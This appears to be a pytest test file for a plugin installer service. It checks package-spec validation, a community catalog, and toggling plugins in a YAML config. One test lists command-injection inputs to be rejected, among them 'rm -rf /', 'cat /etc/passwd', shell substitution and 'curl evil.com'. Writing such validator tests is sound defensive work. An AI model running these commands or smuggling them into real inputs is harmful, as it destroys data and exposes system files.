# ==============================================================================
# File: tests/harness/test_installer_service.py
# Description: Unit tests for harness/installer.py service
# ==============================================================================

import os
import yaml
import tempfile
from pathlib import Path
import pytest

from harness.installer import (
    validate_package_spec,
    get_community_catalog,
    toggle_plugin_state,
    list_all_plugins_status,
)


def test_validate_package_spec_valid():
    valid_specs = [
        "monika-plugin-telegram",
        "monika-plugin-deepseek==1.0.0",
        "monika_plugin_crypto>=2.1.0",
        "https://github.com/monika-harness/plugin-example.git",
        "git+https://github.com/monika-harness/plugin-example.git@main",
        "dist/monika_plugin_test-1.0.0-py3-none-any.whl",
    ]
    for spec in valid_specs:
        is_valid, err = validate_package_spec(spec)
        assert is_valid is True, f"Expected '{spec}' to be valid, got error: {err}"
        assert err == ""


def test_validate_package_spec_malicious_rejected():
    invalid_specs = [
        "",
        "   ",
        "monika-plugin-test; rm -rf /",
        "monika-plugin-test && cat /etc/passwd",
        "monika-plugin-test | whoami",
        "monika-plugin-`id`",
        "$(cat secrets.txt)",
        "monika\nplugin",
        "monika<test>",
        "monika;curl evil.com",
    ]
    for spec in invalid_specs:
        is_valid, err = validate_package_spec(spec)
        assert is_valid is False, f"Expected '{spec}' to be rejected as invalid"
        assert len(err) > 0


def test_get_community_catalog():
    catalog = get_community_catalog()
    assert isinstance(catalog, list)
    assert len(catalog) >= 3

    for item in catalog:
        assert "id" in item
        assert "name" in item
        assert "package" in item
        assert "category" in item
        assert "description" in item
        assert item["package"].startswith("monika-plugin-")


def test_toggle_plugin_state_atomic():
    sample_config = {
        "plugins": {
            "analysis_pipeline": {
                "active": "macro_to_asset",
                "available": {
                    "macro_to_asset": {"enabled": True},
                    "technical_scalping": {"enabled": False},
                },
            },
            "broker": {
                "active": "paper_trading",
                "available": {
                    "paper_trading": {"enabled": True},
                    "mt5_local": {"enabled": True},
                },
            },
            "schedulers": {
                "news_watcher": {"enabled": True},
            },
            "risk_rules": {
                "modular_rules": {
                    "sector_exposure": {"enabled": True},
                },
            },
        }
    }

    with tempfile.NamedTemporaryFile("w", suffix=".yaml", delete=False, encoding="utf-8") as tmp:
        yaml.dump(sample_config, tmp)
        tmp_path = Path(tmp.name)

    try:
        # Toggle technical_scalping to True
        ok, msg = toggle_plugin_state("technical_scalping", "analysis_pipeline", True, settings_file=tmp_path)
        assert ok is True

        with open(tmp_path, "r", encoding="utf-8") as f:
            updated = yaml.safe_load(f)

        assert updated["plugins"]["analysis_pipeline"]["available"]["technical_scalping"]["enabled"] is True

        # Toggle news_watcher to False
        ok, msg = toggle_plugin_state("news_watcher", "schedulers", False, settings_file=tmp_path)
        assert ok is True

        with open(tmp_path, "r", encoding="utf-8") as f:
            updated = yaml.safe_load(f)

        assert updated["plugins"]["schedulers"]["news_watcher"]["enabled"] is False

    finally:
        if tmp_path.exists():
            os.remove(tmp_path)


def test_list_all_plugins_status():
    plugins = list_all_plugins_status()
    assert isinstance(plugins, list)
    assert len(plugins) > 0

    p_ids = [p["id"] for p in plugins]
    assert "macro_to_asset" in p_ids or "paper_trading" in p_ids or "news_watcher" in p_ids

    for p in plugins:
        assert "id" in p
        assert "name" in p
        assert "category" in p
        assert "version" in p
        assert "enabled" in p
        assert "status" in p
        assert "can_toggle" in p
